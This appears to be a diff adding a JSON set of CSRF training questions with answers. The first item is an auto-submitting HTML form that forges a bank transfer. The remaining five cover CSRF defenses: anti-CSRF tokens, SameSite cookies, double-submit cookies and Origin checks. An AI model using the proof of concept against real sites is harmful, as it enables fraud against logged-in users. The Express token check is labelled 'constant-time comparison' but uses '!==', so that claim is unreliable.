@@ -1,0 +1,61 @@
+[
+  {
+    "title": "Anatomy of a CSRF Attack",
+    "ques": "Explain step-by-step how a **Cross-Site Request Forgery (CSRF)** attack operates against an authenticated user session. Provide an HTML proof-of-concept (PoC) hosted on an attacker's website that automatically submits an unauthorized bank fund transfer.",
+    "answer": {
+      "type": "code",
+      "lang": "html",
+      "content": "<!-- Hosted on attacker domain: https://evil-attacker.com/malicious.html -->\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Win Free Gifts!</title>\n</head>\n<body>\n    <h1>Claim your reward below...</h1>\n    \n    <!-- Hidden form targeting the vulnerable banking application -->\n    <form id=\"csrfForm\" action=\"https://vulnerable-bank.com/api/transfer\" method=\"POST\">\n        <input type=\"hidden\" name=\"recipient\" value=\"attacker_account_99\" />\n        <input type=\"hidden\" name=\"amount\" value=\"5000\" />\n    </form>\n\n    <script>\n        // Automatically submit the form the instant the victim loads the page\n        document.getElementById('csrfForm').submit();\n    </script>\n</body>\n</html>"
+    },
+    "explanation": "CSRF exploits the browser's default behavior of automatically attaching stored ambient credentials (cookies, HTTP basic auth headers) to any cross-origin HTTP request directed at the target server."
+  },
+  {
+    "title": "Assessing Real-World CSRF Impact",
+    "ques": "Describe the potential **impact of CSRF** across different types of web services. Why does CSRF generally affect state-changing operations rather than data reading, and what are the most severe outcomes for enterprise applications?",
+    "answer": {
+      "type": "text",
+      "content": "### Why CSRF Targets State Changes Rather Than Data Retrieval\nDue to the **Same-Origin Policy (SOP)**, a cross-origin website (`evil.com`) can **send** an HTTP request to `bank.com`, but the browser prevents `evil.com` from **reading** the HTTP response. Therefore, CSRF cannot directly leak account balances. Instead, it weaponizes state-changing actions (`POST`, `PUT`, `DELETE`, stateful `GET`).\n\n### Critical Enterprise Impacts:\n1. **Financial Fraud:** Unauthorized bank wire transfers, recurring subscription purchases, or gift card redemptions.\n2. **Account Takeover (ATO):** Silently submitting requests to update the victim's email address or recovery phone number to the attacker's details, followed by a password reset trigger.\n3. **Privilege Escalation:** Forcing an authenticated administrator to promote an attacker's user role to `System Administrator`.\n4. **Critical Data Tampering:** Deleting databases, disabling two-factor authentication, or altering DNS routing configurations inside a router admin panel."
+    },
+    "explanation": "Even without visibility into the response data, an attacker can inflict catastrophic damage simply by forcing state mutations on behalf of an authenticated victim."
+  },
+  {
+    "title": "Synchronizer Token Pattern Implementation",
+    "ques": "Detail the **Synchronizer Token Pattern (Anti-CSRF Tokens)** defense mechanism. Write a Node.js/Express implementation demonstrating how to generate a cryptographically random token tied to the user's session, embed it in an HTML form, and validate it on POST submissions.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "const express = require('express');\nconst crypto = require('crypto');\nconst session = require('express-session');\n\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\napp.use(session({ secret: 'app-secret-key', resave: false, saveUninitialized: true }));\n\n// Middleware: Generate CSRF token and store in server session\napp.get('/transfer', (req, res) => {\n  const csrfToken = crypto.randomBytes(32).toString('hex');\n  req.session.csrfToken = csrfToken;\n  \n  res.send(`\n    <form method=\"POST\" action=\"/transfer\">\n      <input type=\"hidden\" name=\"_csrf\" value=\"${csrfToken}\">\n      <input type=\"text\" name=\"recipient\" placeholder=\"Recipient\">\n      <button type=\"submit\">Send Money</button>\n    </form>\n  `);\n});\n\n// POST handler: Validate matching token\napp.post('/transfer', (req, res) => {\n  const formToken = req.body._csrf;\n  const sessionToken = req.session.csrfToken;\n  \n  // Strict validation check using constant-time comparison\n  if (!formToken || !sessionToken || formToken !== sessionToken) {\n    return res.status(403).send('CSRF validation failed: Invalid or missing token');\n  }\n  \n  // Token is valid; proceed with funds transfer\n  res.send('Transfer successful!');\n});"
+    },
+    "explanation": "Because an external origin cannot read the victim's document DOM under the Same-Origin Policy, the attacker cannot predict or obtain the unique session-bound CSRF token to include in forged forms."
+  },
+  {
+    "title": "SameSite Cookie Attribute Configuration",
+    "ques": "Explain how the **`SameSite`** cookie attribute protects against CSRF. Define the behavioral differences between `Strict`, `Lax`, and `None`, and provide an HTTP `Set-Cookie` header example for a secure authentication session.",
+    "answer": {
+      "type": "code",
+      "lang": "http",
+      "content": "# HTTP Response Header with bulletproof session cookie settings:\nSet-Cookie: session_id=s9d82ks901kd83; Path=/; Secure; HttpOnly; SameSite=Strict\n\n# Behavioral breakdown:\n# - SameSite=Strict: Cookie is NEVER sent in any cross-site requests (e.g., clicking external links or cross-site image tags).\n# - SameSite=Lax: Cookie is withheld on cross-site subrequests (POST forms, images, iframes), but IS sent on top-level safe GET navigations (clicking a link).\n# - SameSite=None: Cookie is sent on all cross-site requests (requires the 'Secure' attribute)."
+    },
+    "explanation": "`SameSite=Lax` is the modern browser default and prevents standard form POST CSRF attacks. High-security contexts (such as online banking or admin portals) should employ `SameSite=Strict` for absolute isolation."
+  },
+  {
+    "title": "Double Submit Cookie Pattern",
+    "ques": "Describe the **Double Submit Cookie** pattern used in stateless architectures (e.g., Single Page Applications without server-side session stores). Write a JavaScript client snippet that reads the CSRF cookie and passes it via a custom HTTP request header.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "/**\n * Double Submit Cookie Pattern:\n * 1. The server sets a non-HttpOnly cookie named 'XSRF-TOKEN' containing a pseudo-random value.\n * 2. On state-changing AJAX requests, JavaScript reads this cookie and copies the value into an HTTP header 'X-XSRF-TOKEN'.\n * 3. The server compares the cookie value with the header value. If they match, the request is trusted.\n */\n\n// Helper to get cookie value by name\nfunction getCookie(name) {\n  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));\n  return match ? decodeURIComponent(match[2]) : null;\n}\n\nasync function performSecureAction(payload) {\n  const xsrfToken = getCookie('XSRF-TOKEN');\n  \n  const response = await fetch('/api/user/profile', {\n    method: 'PUT',\n    headers: {\n      'Content-Type': 'application/json',\n      'X-XSRF-TOKEN': xsrfToken // Injected custom header\n    },\n    body: JSON.stringify(payload)\n  });\n  \n  return await response.json();\n}"
+    },
+    "explanation": "Because cross-origin scripts cannot read cookies belonging to another domain, a malicious site cannot extract the `XSRF-TOKEN` cookie to craft the required custom request header."
+  },
+  {
+    "title": "Verifying Origin and Referer Headers",
+    "ques": "How can a web server use the **`Origin`** and **`Referer`** HTTP request headers as a defense-in-depth layer against CSRF? Write an Express middleware function that validates these headers against an allowlist of trusted application domains.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "const ALLOWED_ORIGINS = ['https://mybank.com', 'https://auth.mybank.com'];\n\nfunction verifyOriginReferer(req, res, next) {\n  // Safe methods (GET, HEAD, OPTIONS) do not alter server state\n  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {\n    return next();\n  }\n\n  // Extract Origin or fallback to Referer\n  const sourceOrigin = req.headers['origin'] || (req.headers['referer'] ? new URL(req.headers['referer']).origin : null);\n\n  if (!sourceOrigin) {\n    return res.status(403).json({ error: 'Blocked: Request lacks Origin and Referer headers' });\n  }\n\n  // Validate against strict whitelist\n  if (!ALLOWED_ORIGINS.includes(sourceOrigin)) {\n    return res.status(403).json({ error: 'Blocked: Cross-origin request denied' });\n  }\n\n  next();\n}\n\nmodule.exports = verifyOriginReferer;"
+    },
+    "explanation": "The browser automatically sets the `Origin` header on cross-origin `POST`, `PUT`, and `DELETE` requests and prevents user-level scripts from forging it, making origin inspection an effective secondary check."
+  }
+]
